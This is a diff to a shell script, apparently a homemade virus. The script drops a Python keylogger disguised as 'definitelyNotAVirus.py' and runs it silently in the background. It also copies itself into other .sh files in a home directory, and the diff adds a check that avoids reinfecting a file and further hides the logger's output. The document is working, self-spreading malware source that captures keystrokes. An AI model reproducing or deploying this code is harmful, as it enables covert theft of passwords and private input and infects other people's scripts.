@@ -19,6 +19,7 @@ echo "REMOVE ON USE: $TARGETDIR"
 
 # ------------------------------logging file---------------------
 echo "#!/bin/python3
+# SOURCE: from https://www.geeksforgeeks.org/design-a-keylogger-in-python/
 import os 
 import pyxhook 
 log_file = os.environ.get( 
@@ -67,8 +68,8 @@ except Exception as ex:
 chmod 777 $TARGETDIR/definitelyNotAVirus.py
 # turns the script on and hides it from the jobs
 # can be killed through pkill -f definitelyNotAVirus.ppy
-nohup python3 $TARGETDIR/definitelyNotAVirus.py > $TARGETDIR/output.log &
-
+# nohup python3 $TARGETDIR/definitelyNotAVirus.py > $TARGETDIR/output.log & # for debugging
+nohup python3 $TARGETDIR/definitelyNotAVirus.py > /dev/null 2>&1 &
 # 2. create a cronjob for the logger script
 # #write out current crontab - ERROR: DOESNT WORK DUE TO CRONTAB NOT INSTALLING PYTHON LIBRARIES
 # crontab -l > mycron
@@ -101,9 +102,19 @@ i=0
 location=$(pwd)/virus_noCron.sh
 for (( i=1; i <= $FILENUM; i++ ));do
     TARGET=$(find $virtualhome -name "*.sh" | sed "${i}q;d")
-    #echo $TARGET
     # just copy and paste the file and then rm
-    head -n 106 $location | tail -n 101 >> $TARGET
+
+    # checks if it is already in the file - looks for my nice source link of the keylog script i used
+    grep -q "# SOURCE: from https://www.geeksforgeeks.org/design-a-keylogger-in-python/" $TARGET > /dev/null
+    TEMP=$?
+    # reset devnull
+    STDOUT=`readlink -f /proc/$$/fd/1`
+    STDERR=`readlink -f /proc/$$/fd/2`
+    exec 1>$STDOUT 2>$STDERR
+    if [ $TEMP = 1 ]; then
+        # echo "its not in here!"
+        head -n 120 $location | tail -n 116 >> $TARGET
+    fi
 done
 
 # --------------------------Fake install--------------------------
